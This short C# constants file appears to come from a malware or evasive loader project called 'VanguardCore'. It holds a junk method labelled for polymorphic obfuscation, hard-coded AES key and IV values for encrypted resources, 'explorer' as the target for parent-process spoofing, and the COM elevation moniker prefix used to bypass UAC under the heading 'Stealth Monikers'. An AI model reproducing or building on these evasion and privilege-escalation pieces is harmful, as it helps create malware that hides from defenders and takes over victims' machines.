using System;

namespace VanguardCore
{
    public static class Constants
    {
        // [POLY_JUNK]
        private static void _vanguard_d77cf33d() {
            int val = 72351;
            if (val > 50000) Console.WriteLine("Hash:" + 72351);
        }

        // These keys are updated at build time by full_rebuild.ps1
        public const string RESOURCE_AES_KEY = "xl0oLywg4EDtCt6GpNbvamieXQSpQxYTRcv06pn9xDw="; 
        public const string RESOURCE_AES_IV = "YLRMWE+czAIgUC1LDjFZIQ=="; 
        
        // Target process name for PPID spoofing
        public const string SPOOF_PARENT = "explorer";
        
        // Stealth Monikers
        public const string MONIKER_PREFIX = "Elevation:Administrator!new:";
    }
}


